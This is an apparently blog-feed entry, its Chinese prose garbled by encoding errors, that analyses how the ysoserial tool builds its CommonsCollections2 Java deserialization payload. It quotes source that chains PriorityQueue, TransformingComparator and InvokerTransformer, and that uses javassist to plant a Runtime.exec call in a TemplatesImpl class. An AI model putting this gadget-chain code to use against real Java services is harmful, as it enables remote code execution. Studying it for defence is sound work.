    <content type="html"><![CDATA[<p>ysoserialçš„payloadåªçœ‹è¿‡Groovyå’ŒCommonsCollections1ï¼Œå°±ä¸€ç›´ä»¥ä¸ºysoserialæ˜¯ç®€å•çš„é€šè¿‡æœ€ç»ˆè°ƒç”¨Runtime.getRuntime().exec(cmd)æ¥å®ç°å„ç§åˆ©ç”¨é“¾çš„å‘½ä»¤æ‰§è¡Œçš„ï¼Œå¤ªå¹´è½»ã€‚ã€‚ã€‚</p><p>æœ¬æ–‡ä»¥CommonsCollections2ä¸ºä¾‹ï¼Œä¸»è¦ä»‹ç»ï¼š</p><ol><li>ysoserialé€šè¿‡TemplatesImplå®ç°çš„é€šç”¨å‘½ä»¤æ‰§è¡Œæ‰“åŒ…</li><li>å¦‚ä½•å®ç°ä»£ç æ‰§è¡Œï¼ˆéå‘½ä»¤æ‰§è¡Œï¼‰</li></ol><a id="more"></a><h2 id="ysoserial-æµç¨‹ç®€ä»‹"><a href="#ysoserial-æµç¨‹ç®€ä»‹" class="headerlink" title="ysoserial æµç¨‹ç®€ä»‹"></a>ysoserial æµç¨‹ç®€ä»‹</h2><p>ä½œè€…ä¹Ÿæ˜¯å¾ˆçš®çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar </span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] <span class="string">&#x27;[command]&#x27;</span></span><br><span class="line">Payload                 Authors                Dependencies</span><br><span class="line">-------                 -------                ------------            </span><br><span class="line">BeanShell1             @pwntester, @cschneider4711      bsh:2.0b5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¥å£æ˜¯ysoserial.GeneratePayload, GeneratePayloadé‡Œé¢ç»„åˆæˆæœ€ç»ˆçš„paylaodæµç¨‹å¾ˆç®€å•ï¼Œä¸å¤šä»‹ç»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line"><span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">PrintStream out = System.out;</span><br><span class="line">Serializer.serialize(object, out);</span><br><span class="line">ObjectPayload.Utils.releasePayload(payload, object);</span><br></pre></td></tr></table></figure><h3 id="getObject"><a href="#getObject" class="headerlink" title="getObject"></a>getObject</h3><p>getObjectæ˜¯æ¯ä¸ªpayloadçš„é€šç”¨æ¥å£å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›è¢«åºåˆ—åŒ–çš„obj</p><p>ä»¥CommonsCollections2 ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String ... command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­é¦–å°¾éœ€è¦æ³¨æ„ï¼Œä¸ºé€šç”¨æ‰“åŒ…é€»è¾‘ï¼Œä¸­é—´ä¸ºCommonsCollections2çš„åˆ©ç”¨é“¾ã€‚ä¸‹æ–‡è¯¦ç»†è®²è§£è¿™ä¸¤ä¸ªé€»è¾‘ã€‚</p><h2 id="CommonsCollections2çš„åˆ©ç”¨é“¾"><a href="#CommonsCollections2çš„åˆ©ç”¨é“¾" class="headerlink" title="CommonsCollections2çš„åˆ©ç”¨é“¾"></a>CommonsCollections2çš„åˆ©ç”¨é“¾</h2><p>ysoserialå¯¹äºCommonsCollections2è°ƒç”¨é“¾çš„è§£é‡Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>è·Ÿè¿›è°ƒè¯•</p><p><img src="/images/pasted-109.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform:129, InvokerTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:81, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰æ„æ€çš„ç‚¹</p><ol><li><p>PriorityQueue çš„å±æ€§queueæ˜¯ä¸ªæ•°ç»„ï¼ŒPriorityQueue ååºåˆ—åŒ–ä¼šå¯¹queueæ¯ä¸ªå†…å®¹è¿›è¡Œååºåˆ—åŒ–ä¸ºobjNï¼Œç„¶åè°ƒç”¨heapifyæ–¹æ³•ï¼Œå¤§è‡´åŠŸèƒ½åº”è¯¥æ˜¯è®¡ç®—æ¯ä¸ªqueueçš„ä¼˜å…ˆçº§ã€‚</p></li><li><p>heapify - siftDown - siftDownUsingComparatorï¼Œä¸ºäº†æ¯”è¾ƒç›¸é‚»ä¸¤ä¸ªå€¼å±æ€§ï¼Œå¼•å…¥äº†æ¥å£Comparator, å…¶ä¸­TransformingComparatoræ˜¯è¯¥æ¥å£çš„å®ç°ã€‚</p></li><li><p>TransformingComparator compareæ–¹æ³•ï¼Œé€šè¿‡Transformer å°†å¾…æ¯”è¾ƒçš„ä¸¤å€¼å½’ä¸€åŒ–ï¼Œæ¥å£Transformerçš„å®ç°ç±»InvokerTransformerã€‚</p></li><li><p>InvokerTransformer transform æ–¹æ³•ä½¿ç”¨äº†invokeï¼Œè€Œä¸”methodã€classã€argséƒ½å¯è‡ªå®šä¹‰ã€‚</p></li><li><p>é‚£æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å¯ä»¥class.method(args)å¯æ‰§è¡Œä»»æ„å‘½ä»¤çš„ç±»äº†ã€‚ysoserialä½¿ç”¨çš„æ˜¯é€šç”¨çš„TemplatesImplã€‚</p></li></ol><h2 id="é€šç”¨çš„TemplatesImpl"><a href="#é€šç”¨çš„TemplatesImpl" class="headerlink" title="é€šç”¨çš„TemplatesImpl"></a>é€šç”¨çš„TemplatesImpl</h2><p>å‚è€ƒã€1ã€‘ä¸­å¯¹TemplatesImplè¿™ä¸¤æ®µæ€»ç»“çš„å¾ˆå¥½ï¼Œç›´æ¥ä½¿ç”¨ï¼Œæ€»ç»“ä¸º2ç‚¹</p><ol><li><p>TemplatesImplç±»æœ‰æ„æ€çš„å±æ€§ï¼Œæ˜¯ä¸ªbyte[]æ•°ç»„ï¼Œå¯ä»¥å­˜class</p></li><li><p>TemplatesImplç±»çš„getTransletInstanceæ–¹æ³•ä¼šå°†è¯¥classå®ä¾‹åŒ–ã€‚</p></li></ol><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š</p><ol><li><p>å°†commandå†™åœ¨class çš„static æ–¹æ³•å†…ï¼Œè½¬åŒ–ä¸ºbyteæ•°ç»„å­˜åœ¨TemplatesImpl å®ä¾‹å†…</p></li><li><p>è§¦å‘TemplatesImpl å®ä¾‹çš„getTransletInstance æ–¹æ³•</p></li></ol><h3 id="åˆ©ç”¨TemplatesImplç±»å­˜å‚¨å±é™©çš„å­—èŠ‚ç "><a href="#åˆ©ç”¨TemplatesImplç±»å­˜å‚¨å±é™©çš„å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨TemplatesImplç±»å­˜å‚¨å±é™©çš„å­—èŠ‚ç "></a>åˆ©ç”¨TemplatesImplç±»å­˜å‚¨å±é™©çš„å­—èŠ‚ç </h3><p>è¿™é‡Œå¼ºçƒˆå»ºè®®é˜…è¯»åŸæ–‡ï¼Œæˆ–è€…ä¹‹åå•ç‹¬å†™ç¯‡javassistçš„å­—èŠ‚ç æ“ä½œ</p><p>ç•™ä¸‹ä¸¤ä¸ªç›¸å…³çŸ¥è¯†ç‚¹ï¼š</p><ol><li>class å’Œ byte[] å¦‚ä½•ç›¸äº’è½¬æ¢</li><li>ä½¿ç”¨javassiståœ¨classå†…æ’å…¥staticä»£ç </li></ol><p>ç›¸å…³ä»£ç é€»è¾‘åœ¨ysoserial.util.Gadgets#createTemplatesImplä¸ŠåŠéƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + command.replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line">    <span class="comment">// added by m0d9</span></span><br><span class="line">    clazz.writeFile();</span><br></pre></td></tr></table></figure><p>ysoserialç”Ÿæˆçš„classæ–‡ä»¶demo</p><p><img src="/images/pasted-111.png" alt="upload successful"></p><h3 id="è§¦å‘TemplatesImplç±»åŠ è½½-bytecodeså±æ€§ä¸­çš„å­—èŠ‚ç "><a href="#è§¦å‘TemplatesImplç±»åŠ è½½-bytecodeså±æ€§ä¸­çš„å­—èŠ‚ç " class="headerlink" title="è§¦å‘TemplatesImplç±»åŠ è½½_bytecodeså±æ€§ä¸­çš„å­—èŠ‚ç "></a>è§¦å‘TemplatesImplç±»åŠ è½½_bytecodeså±æ€§ä¸­çš„å­—èŠ‚ç </h3><p>ysoserialå¯¹äºTemplatesImplè°ƒç”¨é“¾çš„è§£é‡Šï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">  TemplatesImpl.newTransformer()</span><br><span class="line">    TemplatesImpl.getTransletInstance()</span><br><span class="line">      TemplatesImpl.defineTransletClasses()</span><br><span class="line">        ClassLoader.defineClass()</span><br><span class="line">        Class.newInstance()</span><br><span class="line">          ...</span><br><span class="line">            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">            &#x2F;&#x2F;classæ–°å»ºåˆå§‹åŒ–å¯¹è±¡åï¼Œä¼šæ‰§è¡Œæ¶æ„ç±»ä¸­çš„é™æ€æ–¹æ³•ï¼Œå³:æˆ‘ä»¬æ’å…¥çš„æ¶æ„javaä»£ç </span><br><span class="line">              ...</span><br><span class="line">                Runtime.exec()&#x2F;&#x2F;è¿™é‡Œå¯ä»¥æ˜¯ä»»æ„javaä»£ç ï¼Œæ¯”å¦‚:åå¼¹shellç­‰ç­‰ã€‚ </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-110.png" alt="upload successful"></p><p>ç›¸å…³ä»£ç é€»è¾‘åœ¨ysoserial.util.Gadgets#createTemplatesImplä¸‹åŠéƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inject class bytes into instance</span></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">    classBytes,</span><br><span class="line">    ClassFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="keyword">return</span> templates;</span><br></pre></td></tr></table></figure><h2 id="å®ç°ä»£ç æ‰§è¡Œ"><a href="#å®ç°ä»£ç æ‰§è¡Œ" class="headerlink" title="å®ç°ä»£ç æ‰§è¡Œ"></a>å®ç°ä»£ç æ‰§è¡Œ</h2><p>å‚è€ƒã€2ã€‘ä¸­æœ‰å®ç°ï¼Œå¯ä»¥å‚è€ƒå…¶ä¸­çš„TomcatEchoInjectã€TomcatShellInject</p><ol><li><p>è‡ªå®šä¹‰ç»§æ‰¿AbstractTransletç±»ï¼Œstaticä»£ç æ®µä¸ºéœ€è¦å®ç°çš„ä»£ç </p></li><li><p>å°†è¯¥ç±»classè½¬ä¸ºbyteï¼Œå­˜å…¥TemplatesImpl byteæ•°ç»„å³å¯</p></li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">javaååºåˆ—åŒ–å·¥å…·ysoserialåˆ†æ</a></li><li>[2] <a href="https://github.com/threedr3am/ysoserial">threedr3am/ysoserial</a></li><li>[3] <a href="https://github.com/wh1t3p1g/ysomap">wh1t3p1g/ysomap</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ysoserialçš„payloadåªçœ‹è¿‡Groovyå’ŒCommonsCollections1ï¼Œå°±ä¸€ç›´ä»¥ä¸ºysoserialæ˜¯ç®€å•çš„é€šè¿‡æœ€ç»ˆè°ƒç”¨Runtime.getRuntime().exec(cmd)æ¥å®ç°å„ç§åˆ©ç”¨é“¾çš„å‘½ä»¤æ‰§è¡Œçš„ï¼Œå¤ªå¹´è½»ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡ä»¥CommonsCollections2ä¸ºä¾‹ï¼Œä¸»è¦ä»‹ç»ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ysoserialé€šè¿‡TemplatesImplå®ç°çš„é€šç”¨å‘½ä»¤æ‰§è¡Œæ‰“åŒ…&lt;/li&gt;
&lt;li&gt;å¦‚ä½•å®ç°ä»£ç æ‰§è¡Œï¼ˆéå‘½ä»¤æ‰§è¡Œï¼‰&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="Ysoserial" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/Ysoserial/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="ysoserial" scheme="http://m0d9.me/tags/ysoserial/"/>
    
    <category term="TemplatesImpl" scheme="http://m0d9.me/tags/TemplatesImpl/"/>
    
  </entry>
  
</feed>
